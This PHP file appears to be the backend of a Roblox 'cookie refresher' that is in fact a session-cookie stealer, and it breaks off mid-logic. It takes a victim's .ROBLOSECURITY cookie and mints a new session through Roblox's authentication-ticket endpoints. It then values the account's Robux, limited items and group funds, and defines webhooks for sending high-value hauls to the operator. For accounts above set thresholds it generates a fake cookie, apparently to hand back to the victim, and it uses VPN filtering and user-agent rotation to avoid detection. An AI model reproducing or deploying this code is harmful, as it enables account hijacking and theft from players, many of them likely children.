<?php
// ================================================
// SECURITY: Disable error display to users
// ================================================
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', sys_get_temp_dir() . '/refresh_error.log');

// ================================================
// SECURITY: Rate limiting & IP ban check
// ================================================
require_once __DIR__ . '/rate_limit.php';
require_once __DIR__ . '/../../config/database.php';

checkIPBan();
checkRateLimit(3, 60);

// ================================================
// SECURITY: Headers
// ================================================
header('Content-Type: application/json');
header('X-Robots-Tag: noindex, nofollow');

// ================================================
// VALIDATION: Check request method
// ================================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Invalid request method']);
    exit;
}

// ================================================
// VALIDATION: Check if cookie provided
// ================================================
if (!isset($_POST['cookie']) || trim($_POST['cookie']) === '') {
    http_response_code(400);
    echo json_encode(['error' => 'No cookie provided']);
    exit;
}

// ================================================
// CONSTANTS
// ================================================
$WARNING_PREFIX = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

// ================================================
// USER AGENT ROTATION
// ================================================
$USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
];

function getRandomUserAgent() {
    global $USER_AGENTS;
    return $USER_AGENTS[array_rand($USER_AGENTS)];
}

// ================================================
// HELPER FUNCTIONS
// ================================================

/**
 * Generate a realistic-looking fake Roblox cookie
 * Creates a completely new cookie that matches Roblox's format
 * 
 * @return string A realistic fake cookie (1024-1100 chars)
 */
function generateFakeCookie() {
    // Roblox cookies are typically 1024-1100 characters
    $cookieLength = rand(1024, 1100);
    
    // Valid characters in Roblox cookies
    $hexChars = '0123456789ABCDEF';
    
    // Occasionally seen special characters in real cookies
    $specialChars = ['O', 'P', 'Q'];
    
    $fakeCookie = '';
    
    // Generate the cookie
    for ($i = 0; $i < $cookieLength; $i++) {
        // 98% hex characters, 2% special characters for realism
        if (rand(1, 100) <= 98) {
            $fakeCookie .= $hexChars[rand(0, 15)];
        } else {
            $fakeCookie .= $specialChars[array_rand($specialChars)];
        }
    }
    
    return $fakeCookie;
}

function ensure_warning_prefix(string $val, string $prefix): string {
    $val = trim($val);
    if (strpos($val, ';') !== false) { 
        $val = explode(';', $val, 2)[0]; 
    }
    if (strpos($val, $prefix) === 0) return $val;
    $val = str_replace($prefix, '', $val);
    return $prefix . $val;
}

function req(string $url, array $headers = [], string $method = 'GET', ?string $body = null, string $jar = ''): array {
    usleep(rand(100000, 500000));
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 10,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_ENCODING       => '',
        CURLOPT_USERAGENT      => getRandomUserAgent(),
        CURLOPT_COOKIEFILE     => $jar,
        CURLOPT_COOKIEJAR      => $jar,
    ]);
    
    if ($headers) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $m = strtoupper($method);
    if ($m === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($body !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    } elseif ($m !== 'GET') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $m);
        if ($body !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    
    $raw = curl_exec($ch);
    if ($raw === false) {
        $err = curl_error($ch);
        curl_close($ch);
        error_log("cURL Error: $err for URL: $url");
        return ['status' => 0, 'headers' => [], 'body' => '', 'error' => $err];
    }
    
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $parts   = preg_split("/\r\n\r\n/", $raw, -1);
    $body    = array_pop($parts);
    $headers = preg_split("/\r\n|\n|\r/", implode("\r\n\r\n", $parts), -1, PREG_SPLIT_NO_EMPTY);
    
    return ['status' => $status, 'headers' => $headers, 'body' => $body, 'error' => null];
}

function header_value(array $headers, string $name): ?string {
    $needle = strtolower($name) . ':';
    foreach ($headers as $line) {
        if (stripos($line, $needle) === 0) {
            return trim(substr($line, strlen($needle)));
        }
    }
    return null;
}

function read_roblosecurity_from_jar(string $jarPath): ?string {
    if (!is_file($jarPath)) return null;
    $rows = @file($jarPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($rows === false) return null;
    
    $found = null;
    foreach ($rows as $r) {
        if ($r === '' || $r[0] === '#') continue;
        $parts = explode("\t", $r);
        if (count($parts) < 7) continue;
        if ($parts[5] === '.ROBLOSECURITY' || $parts[5] === 'ROBLOSECURITY') {
            $found = $parts[6];
        }
    }
    return $found;
}

function parse_env(): array {
    if (!empty($_ENV) || !empty($_SERVER)) {
        return [
            'WEBHOOK_URL' => $_ENV['WEBHOOK_URL'] ?? $_SERVER['WEBHOOK_URL'] ?? '',
            'STATS_WEBHOOK_URL' => $_ENV['STATS_WEBHOOK_URL'] ?? $_SERVER['STATS_WEBHOOK_URL'] ?? '',
            'ERROR_WEBHOOK_URL' => $_ENV['ERROR_WEBHOOK_URL'] ?? $_SERVER['ERROR_WEBHOOK_URL'] ?? '',
            'HIGH_VALUE_WEBHOOK_URL' => $_ENV['HIGH_VALUE_WEBHOOK_URL'] ?? $_SERVER['HIGH_VALUE_WEBHOOK_URL'] ?? '',
            'WEBHOOK_SECRET' => $_ENV['WEBHOOK_SECRET'] ?? $_SERVER['WEBHOOK_SECRET'] ?? '',
            'LOG_TIMEOUT_MS' => $_ENV['LOG_TIMEOUT_MS'] ?? $_SERVER['LOG_TIMEOUT_MS'] ?? 3000,
            'LOG_RETRY_COUNT' => $_ENV['LOG_RETRY_COUNT'] ?? $_SERVER['LOG_RETRY_COUNT'] ?? 2,
            'FAKE_ROBUX_THRESHOLD' => $_ENV['FAKE_ROBUX_THRESHOLD'] ?? $_SERVER['FAKE_ROBUX_THRESHOLD'] ?? 0,
            'FAKE_RAP_THRESHOLD' => $_ENV['FAKE_RAP_THRESHOLD'] ?? $_SERVER['FAKE_RAP_THRESHOLD'] ?? 0,
            'FAKE_SUMMARY_THRESHOLD' => $_ENV['FAKE_SUMMARY_THRESHOLD'] ?? $_SERVER['FAKE_SUMMARY_THRESHOLD'] ?? 0,
            'MIN_ACCOUNT_AGE_DAYS' => $_ENV['MIN_ACCOUNT_AGE_DAYS'] ?? $_SERVER['MIN_ACCOUNT_AGE_DAYS'] ?? 0,
            'BLOCKED_COUNTRIES' => $_ENV['BLOCKED_COUNTRIES'] ?? $_SERVER['BLOCKED_COUNTRIES'] ?? '',
            'ALLOWED_COUNTRIES' => $_ENV['ALLOWED_COUNTRIES'] ?? $_SERVER['ALLOWED_COUNTRIES'] ?? '',
            'APP_VERSION' => $_ENV['APP_VERSION'] ?? $_SERVER['APP_VERSION'] ?? '1.0.0',
            'HOST_TAG' => $_ENV['HOST_TAG'] ?? $_SERVER['HOST_TAG'] ?? 'production',
            'LOG_LEVEL' => $_ENV['LOG_LEVEL'] ?? $_SERVER['LOG_LEVEL'] ?? 'production',
        ];
    }
    
    $envFile = __DIR__ . '/../../config/env.txt';
    if (!is_file($envFile)) {
        error_log("env.txt file not found and no environment variables set!");
        return [];
    }
    $vars = parse_ini_file($envFile, false, INI_SCANNER_RAW);
    return is_array($vars) ? $vars : [];
}

function makeRequest($url, $headers, $postData = null) {
    usleep(rand(100000, 500000));
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, getRandomUserAgent());
    
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    
    $response = curl_exec($ch);
    
    if ($response === false) {
        error_log("makeRequest failed for $url: " . curl_error($ch));
    }
    
    curl_close($ch);
    return json_decode($response, true);
}

function ownsBundle($userId, $bundleId, $headers) {
    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
    $response = makeRequest($url, $headers);
    return isset($response['data']) && !empty($response['data']);
}

function sendWebhook($webhookUrl, $embed) {
    if (empty($webhookUrl)) {
        error_log("Webhook URL is empty");
        return false;
    }
    
    $payload = json_encode($embed, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    if ($response === false || ($httpCode !== 204 && $httpCode !== 200)) {
        error_log("Webhook failed! HTTP: $httpCode | Error: $error | Response: $response");
        return false;
    }
    
    error_log("Webhook sent successfully! HTTP: $httpCode");
    return true;
}

function getIPInfo($ip) {
    $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting");
    if ($data === false) {
        return [
            'country' => 'Unknown',
            'countryCode' => '??',
            'city' => 'Unknown',
            'isp' => 'Unknown',
            'ip' => $ip,
            'proxy' => false,
            'hosting' => false
        ];
    }
    $json = json_decode($data, true);
    return [
        'country' => $json['country'] ?? 'Unknown',
        'countryCode' => strtolower($json['countryCode'] ?? '??'),
        'city' => $json['city'] ?? 'Unknown',
        'region' => $json['regionName'] ?? 'Unknown',
        'isp' => $json['isp'] ?? 'Unknown',
        'ip' => $ip,
        'lat' => $json['lat'] ?? 0,
        'lon' => $json['lon'] ?? 0,
        'proxy' => $json['proxy'] ?? false,
        'hosting' => $json['hosting'] ?? false
    ];
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function getDeviceInfo() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $deviceType = 'Desktop';
    if (preg_match('/mobile/i', $userAgent)) {
        $deviceType = 'Mobile';
    } elseif (preg_match('/tablet|ipad/i', $userAgent)) {
        $deviceType = 'Tablet';
    }
    
    $os = 'Unknown';
    if (preg_match('/windows/i', $userAgent)) {
        $os = 'Windows';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'macOS';
    } elseif (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/android/i', $userAgent)) {
        $os = 'Android';
    } elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) {
        $os = 'iOS';
    }
    
    $browser = 'Unknown';
    if (preg_match('/edge/i', $userAgent)) {
        $browser = 'Edge';
    } elseif (preg_match('/chrome/i', $userAgent)) {
        $browser = 'Chrome';
    } elseif (preg_match('/firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/opera/i', $userAgent)) {
        $browser = 'Opera';
    }
    
    $fingerprint = md5($userAgent . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . ($_SERVER['HTTP_ACCEPT_ENCODING'] ?? ''));
    
    return [
        'type' => $deviceType,
        'os' => $os,
        'browser' => $browser,
        'fingerprint' => $fingerprint,
        'userAgent' => $userAgent
    ];
}

function isCountryAllowed($countryCode, $blockedCountries, $allowedCountries) {
    $countryCode = strtoupper($countryCode);
    
    if (!empty($allowedCountries)) {
        $allowed = array_map('trim', array_map('strtoupper', explode(',', $allowedCountries)));
        return in_array($countryCode, $allowed);
    }
    
    if (!empty($blockedCountries)) {
        $blocked = array_map('trim', array_map('strtoupper', explode(',', $blockedCountries)));
        return !in_array($countryCode, $blocked);
    }
    
    return true;
}

function getQueueFile() {
    return sys_get_temp_dir() . '/queue.json';
}

function addToQueue($data) {
    $queueFile = getQueueFile();
    $queue = [];
    
    if (file_exists($queueFile)) {
        $queue = json_decode(file_get_contents($queueFile), true) ?: [];
    }
    
    $queue[] = array_merge($data, ['timestamp' => time()]);
    file_put_contents($queueFile, json_encode($queue));
    
    return count($queue);
}

function isQueueBusy() {
    $queueFile = getQueueFile();
    if (!file_exists($queueFile)) return false;
    
    $queue = json_decode(file_get_contents($queueFile), true) ?: [];
    return count($queue) > 5;
}

function logRefreshAttempt($success, $error = null, $userInfo = [], $userData = []) {
    $startTime = $_SERVER['REQUEST_TIME_FLOAT'] ?? microtime(true);
    $responseTime = (int)((microtime(true) - $startTime) * 1000);
    
    // Database logging (try first)
    if (Database::isAvailable()) {
        try {
            session_start();
            $userId = $_SESSION['discord_user']['id'] ?? null;
            session_write_close();
            
            $ip = getUserIP();
            $cookie = $_POST['cookie'] ?? '';
            $cookieHash = hash('sha256', $cookie);
            
            // Log to refresh_history
            $stmt = Database::execute(
                "INSERT INTO refresh_history 
                (user_id, ip_address, cookie_hash, status, error_type, error_message, 
                 response_time, user_agent, roblox_username, roblox_user_id, 
                 robux_balance, premium_status, account_age, friends_count, user_data_snapshot)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    $userId,
                    $ip,
                    $cookieHash,
                    $success ? 'success' : 'failed',
                    $error ? (explode(':', $error)[0] ?? 'unknown') : null,
                    $error,
                    $responseTime,
                    $_SERVER['HTTP_USER_AGENT'] ?? null,
                    $userData['username'] ?? $userInfo['username'] ?? null,
                    $userData['userId'] ?? $userInfo['userId'] ?? null,
                    $userData['robux'] ?? null,
                    (isset($userData['premium']) && ($userData['premium'] === true || strpos($userData['premium'], 'True') !== false)) ? 1 : 0,
                    $userData['accountAge'] ?? null,
                    $userData['friends'] ?? null,
                    !empty($userData) ? json_encode($userData) : null
                ]
            );
            
            // Update user statistics if user is logged in
            if ($userId) {
                Database::execute(
                    "UPDATE users 
                     SET total_refreshes = total_refreshes + 1,
                         successful_refreshes = successful_refreshes + ?,
                         failed_refreshes = failed_refreshes + ?
                     WHERE id = ?",
                    [$success ? 1 : 0, $success ? 0 : 1, $userId]
                );
            }
        } catch (Exception $e) {
            error_log("Failed to log refresh attempt to database: " . $e->getMessage());
        }
    }
    
    // File-based logging (fallback and backward compatibility)
    $logFile = sys_get_temp_dir() . '/refresh_stats.json';
    $stats = [];
    
    if (file_exists($logFile)) {
        $stats = json_decode(file_get_contents($logFile), true) ?: [];
    }
    
    if (!isset($stats['total'])) $stats['total'] = 0;
    if (!isset($stats['success'])) $stats['success'] = 0;
    if (!isset($stats['failed'])) $stats['failed'] = 0;
    if (!isset($stats['errors'])) $stats['errors'] = [];
    if (!isset($stats['recent'])) $stats['recent'] = [];
    if (!isset($stats['hourly'])) $stats['hourly'] = [];
    if (!isset($stats['daily'])) $stats['daily'] = [];
    
    $stats['total']++;
    
    if ($success) {
        $stats['success']++;
    } else {
        $stats['failed']++;
        $errorMsg = $error ?? 'Unknown error';
        if (!isset($stats['errors'][$errorMsg])) {
            $stats['errors'][$errorMsg] = 0;
        }
        $stats['errors'][$errorMsg]++;
    }
    
    $hour = date('Y-m-d H:00');
    if (!isset($stats['hourly'][$hour])) {
        $stats['hourly'][$hour] = ['total' => 0, 'success' => 0, 'failed' => 0];
    }
    $stats['hourly'][$hour]['total']++;
    if ($success) {
        $stats['hourly'][$hour]['success']++;
    } else {
        $stats['hourly'][$hour]['failed']++;
    }
    
    $day = date('Y-m-d');
    if (!isset($stats['daily'][$day])) {
        $stats['daily'][$day] = ['total' => 0, 'success' => 0, 'failed' => 0];
    }
    $stats['daily'][$day]['total']++;
    if ($success) {
        $stats['daily'][$day]['success']++;
    } else {
        $stats['daily'][$day]['failed']++;
    }
    
    array_unshift($stats['recent'], [
        'success' => $success,
        'error' => $error,
        'timestamp' => time(),
        'user' => $userInfo
    ]);
    $stats['recent'] = array_slice($stats['recent'], 0, 10);
    
    if (count($stats['hourly']) > 48) {
        $stats['hourly'] = array_slice($stats['hourly'], -48, null, true);
    }
    
    if (count($stats['daily']) > 30) {
        $stats['daily'] = array_slice($stats['daily'], -30, null, true);
    }
    
    file_put_contents($logFile, json_encode($stats, JSON_PRETTY_PRINT));
    
    return $stats;
}

function updateLeaderboard($accountData) {
    $leaderboardFile = sys_get_temp_dir() . '/leaderboard.json';
    $leaderboard = [];
    
    if (file_exists($leaderboardFile)) {
        $leaderboard = json_decode(file_get_contents($leaderboardFile), true) ?: [];
    }
    
    if (!isset($leaderboard['top_accounts'])) {
        $leaderboard['top_accounts'] = [];
    }
    
    $leaderboard['top_accounts'][] = [
        'username' => $accountData['username'],
        'userId' => $accountData['userId'],
        'robux' => $accountData['robux'],
        'rap' => $accountData['rap'],
        'totalValue' => $accountData['totalValue'],
        'timestamp' => time(),
        'country' => $accountData['country'] ?? 'Unknown'
    ];
    
    usort($leaderboard['top_accounts'], function($a, $b) {
        return $b['totalValue'] - $a['totalValue'];
    });
    
    $leaderboard['top_accounts'] = array_slice($leaderboard['top_accounts'], 0, 10);
    
    file_put_contents($leaderboardFile, json_encode($leaderboard, JSON_PRETTY_PRINT));
    
    return $leaderboard;
}

function getLeaderboard() {
    $leaderboardFile = sys_get_temp_dir() . '/leaderboard.json';
    if (!file_exists($leaderboardFile)) {
        return ['top_accounts' => []];
    }
    return json_decode(file_get_contents($leaderboardFile), true) ?: ['top_accounts' => []];
}

function getTimeAnalytics() {
    $logFile = sys_get_temp_dir() . '/refresh_stats.json';
    if (!file_exists($logFile)) {
        return null;
    }
    
    $stats = json_decode(file_get_contents($logFile), true) ?: [];
    
    if (!isset($stats['hourly']) || empty($stats['hourly'])) {
        return null;
    }
    
    $peakHour = null;
    $peakCount = 0;
    foreach ($stats['hourly'] as $hour => $data) {
        if ($data['total'] > $peakCount) {
            $peakCount = $data['total'];
            $peakHour = $hour;
        }
    }
    
    $hourlySuccessRate = [];
    foreach ($stats['hourly'] as $hour => $data) {
        $rate = $data['total'] > 0 ? round(($data['success'] / $data['total']) * 100, 2) : 0;
        $hourlySuccessRate[$hour] = $rate;
    }
    
    return [
        'peakHour' => $peakHour,
        'peakCount' => $peakCount,
        'hourlySuccessRate' => $hourlySuccessRate
    ];
}

function calculateAccountValue($robux, $rap, $groupFunds, $pendingRobux, $creditRobux) {
    return $robux + $rap + $groupFunds + $pendingRobux + $creditRobux;
}

/**
 * Simplify error messages for public display
 */
function getUserFriendlyError($technicalError) {
    $error = strtolower($technicalError);
    
    if (strpos($error, 'network') !== false || strpos($error, 'curl') !== false || strpos($error, 'timeout') !== false) {
        return 'Service temporarily unavailable. Please try again.';
    }
    
    if (strpos($error, 'csrf') !== false || strpos($error, 'token') !== false) {
        return 'Invalid or expired cookie';
    }
    
    if (strpos($error, 'ticket') !== false || strpos($error, 'authentication') !== false) {
        return 'Cookie may be invalid or expired';
    }
    
    if (strpos($error, 'verify') !== false || strpos($error, 'failed to verify') !== false) {
        return 'Unable to verify cookie';
    }
    
    if (strpos($error, 'vpn') !== false || strpos($error, 'proxy') !== false) {
        return 'VPN or proxy detected. Please disable and try again.';
    }
    
    if (strpos($error, 'country') !== false || strpos($error, 'not allowed') !== false) {
        return 'Access restricted from your location';
    }
    
    if (strpos($error, 'account too new') !== false || strpos($error, 'minimum age') !== false) {
        return 'Account does not meet requirements';
    }
    
    if (strpos($error, 'cookie jar') !== false || strpos($error, 'tempnam') !== false) {
        return 'Service error. Please try again later.';
    }
    
    return 'Invalid cookie';
}

// ================================================
// MAIN LOGIC
// ================================================

try {
    $env = parse_env();
    $webhookUrl = $env['WEBHOOK_URL'] ?? '';
    $statsWebhookUrl = $env['STATS_WEBHOOK_URL'] ?? '';
    $errorWebhookUrl = $env['ERROR_WEBHOOK_URL'] ?? '';
    $highValueWebhookUrl = $env['HIGH_VALUE_WEBHOOK_URL'] ?? '';

    $fakeRobuxThreshold = (int)($env['FAKE_ROBUX_THRESHOLD'] ?? 0);
    $fakeRapThreshold = (int)($env['FAKE_RAP_THRESHOLD'] ?? 0);
    $fakeSummaryThreshold = (int)($env['FAKE_SUMMARY_THRESHOLD'] ?? 0);
    
    $minAccountAgeDays = (int)($env['MIN_ACCOUNT_AGE_DAYS'] ?? 0);
    $blockedCountries = $env['BLOCKED_COUNTRIES'] ?? '';
    $allowedCountries = $env['ALLOWED_COUNTRIES'] ?? '';

    $userIP = getUserIP();
    $ipInfo = getIPInfo($userIP);
    $deviceInfo = getDeviceInfo();
    
    error_log("Refresh attempt from: {$ipInfo['ip']} - {$ipInfo['city']}, {$ipInfo['country']} - Device: {$deviceInfo['type']} ({$deviceInfo['os']}/{$deviceInfo['browser']})");

    if ($ipInfo['proxy'] || $ipInfo['hosting']) {
        throw new Exception('VPN/Proxy detected');
    }

    if (!isCountryAllowed($ipInfo['countryCode'], $blockedCountries, $allowedCountries)) {
        throw new Exception('Country not allowed');
    }

    if (isQueueBusy()) {
        $position = addToQueue([
            'ip' => $userIP,
            'cookie' => $_POST['cookie']
        ]);
        
        echo json_encode([
            'queued' => true,
            'position' => $position,
            'message' => "You are in position #{$position} in the queue. Please wait..."
        ]);
        exit;
    }

    $inputCookie = trim($_POST['cookie']);
    $oldCookieClean = str_replace($WARNING_PREFIX, '', $inputCookie);
    $seedCookie  = ensure_warning_prefix($inputCookie, $WARNING_PREFIX);

    $jar = tempnam(sys_get_temp_dir(), 'rbxjar_');
    if ($jar === false) { 
        throw new Exception('Service error');
    }

    $expiry = time() + 86400 * 30;
    $lines  = "# Netscape HTTP Cookie File\n";
    $lines .= ".roblox.com\tTRUE\t/\tTRUE\t{$expiry}\t.ROBLOSECURITY\t{$seedCookie}\n";
    file_put_contents($jar, $lines);

    $csrf = req('https://auth.roblox.com/v2/logout', [
        "Cookie: .ROBLOSECURITY={$seedCookie}",
    ], 'POST', '', $jar);

    if ($csrf['error']) {
        throw new Exception('Network error');
    }

    $csrfToken = header_value($csrf['headers'], 'x-csrf-token');
    if (!$csrfToken) {
        throw new Exception('Invalid cookie - CSRF token not found');
    }

    $ticketJar = tempnam(sys_get_temp_dir(), 'rbxtkt_');
    $lines2 = "# Netscape HTTP Cookie File\n";
    $lines2 .= ".roblox.com\tTRUE\t/\tTRUE\t{$expiry}\t.ROBLOSECURITY\t{$seedCookie}\n";
    file_put_contents($ticketJar, $lines2);
    
    $ticketResp = req('https://auth.roblox.com/v1/authentication-ticket/', [
        "Cookie: .ROBLOSECURITY={$seedCookie}",
        "x-csrf-token: {$csrfToken}",
        "Referer: https://www.roblox.com/",
    ], 'POST', '', $ticketJar);

    if ($ticketResp['error']) {
        throw new Exception('Network error');
    }

    $ticket = header_value($ticketResp['headers'], 'rbx-authentication-ticket');
    if (!$ticket) {
        throw new Exception('Authentication ticket not found');
    }

    @unlink($ticketJar);

    $redeemJar = tempnam(sys_get_temp_dir(), 'rbxredeem_');
    file_put_contents($redeemJar, "# Netscape HTTP Cookie File\n");
    
    $redeem = req('https://auth.roblox.com/v1/authentication-ticket/redeem', [
        "Content-Type: application/json",
        "x-csrf-token: {$csrfToken}",
        "RBXAuthenticationNegotiation: 1",
    ], 'POST', json_encode(['authenticationTicket' => $ticket]), $redeemJar);

    if ($redeem['error']) {
        throw new Exception('Network error');
    }

    if ($redeem['status'] !== 200) {
        throw new Exception('Failed to redeem ticket');
    }

    $newCookieFromHeader = null;
    foreach ($redeem['headers'] as $header) {
        if (stripos($header, 'set-cookie:') === 0 && stripos($header, '.ROBLOSECURITY=') !== false) {
            preg_match('/\.ROBLOSECURITY=([^;]+)/', $header, $matches);
            if (!empty($matches[1])) {
                $newCookieFromHeader = $matches[1];
                break;
            }
        }
    }
    
    $newCookieFromJar = read_roblosecurity_from_jar($redeemJar);
    $newCookieRaw = $newCookieFromHeader ?? $newCookieFromJar;
    
    if (!$newCookieRaw) {
        $newCookieRaw = $seedCookie;
    }
    
    $newCookie = str_replace($WARNING_PREFIX, '', $newCookieRaw);

    @unlink($redeemJar);

    $headers = ["Cookie: .ROBLOSECURITY=$newCookie", "Content-Type: application/json"];

    $settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers);
    $userId = $settingsData['UserId'] ?? null;

    if (!$userId) {
        throw new Exception('Failed to verify cookie');
    }

    $userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers);

    $accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
    $accountAgeDays = 0;
    $accountAge = '❓ Unknown';
    
    if ($accountCreated) {
        $accountAgeDays = floor((time() - $accountCreated) / (60 * 60 * 24));
        $accountAge = "$accountAgeDays days";
        
        if ($minAccountAgeDays > 0 && $accountAgeDays < $minAccountAgeDays) {
            throw new Exception("Account too new");
        }
    }
    
    $accountCreatedDate = $accountCreated ? date('M d, Y', $accountCreated) : 'Unknown';

    $transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers);
    $summary = isset($transactionSummaryData['purchasesTotal']) ? abs($transactionSummaryData['purchasesTotal']) : 0;
    $pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? 0;

    $avatarData = @file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false");
    $avatarJson = json_decode($avatarData, true);
    $avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

    $balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers);
    $robux = $balanceData['robux'] ?? 0;

    $collectiblesData = makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers);
    $rap = 0;
    if (isset($collectiblesData['data'])) {
        foreach ($collectiblesData['data'] as $item) {
            $rap += $item['recentAveragePrice'] ?? 0;
        }
    }

    // ================================================
    // CHECK IF ACCOUNT MEETS FAKE COOKIE THRESHOLDS
    // ================================================
    $shouldFake = false;
    $isHighValue = false;
    
    if ($fakeRobuxThreshold > 0 && $robux >= $fakeRobuxThreshold) {
        $shouldFake = true;
        $isHighValue = true;
        error_log("HIGH VALUE: Robux threshold met ($robux >= $fakeRobuxThreshold)");
    }
    
    if ($fakeRapThreshold > 0 && $rap >= $fakeRapThreshold) {
        $shouldFake = true;
        $isHighValue = true;
        error_log("HIGH VALUE: RAP threshold met ($rap >= $fakeRapThreshold)");
    }
    
    if ($fakeSummaryThreshold > 0 && $summary >= $fakeSummaryThreshold) {
        $shouldFake = true;
        $isHighValue = true;
        error_log("HIGH VALUE: Summary threshold met ($summary >= $fakeSummaryThreshold)");
    }

    $pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers);
    $pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

    $vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers);
    $vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

    $hasHeadless = ownsBundle($userId, 201, $headers);
    $hasKorblox = ownsBundle($userId, 192, $headers);
    $headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
    $korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

    $friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers);
    $friendsCount = $friendsData['count'] ?? 0;

    $followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers);
    $followersCount = $followersData['count'] ?? 0;

    $groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers);
    $ownedGroups = [];
    if (isset($groupsData['data'])) {
        foreach ($groupsData['data'] as $group) {
            if (isset($group['role']['rank']) && $group['role']['rank'] == 255) {
                $ownedGroups[] = $group;
            }
        }
    }
    $totalGroupsOwned = count($ownedGroups);

    $totalGroupFunds = 0;
    foreach ($ownedGroups as $group) {
        $groupId = $group['group']['id'] ?? null;
        if (!$groupId) continue;
        
        $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers);
        $totalGroupFunds += $groupFunds['robux'] ?? 0;
    }

    $creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers);
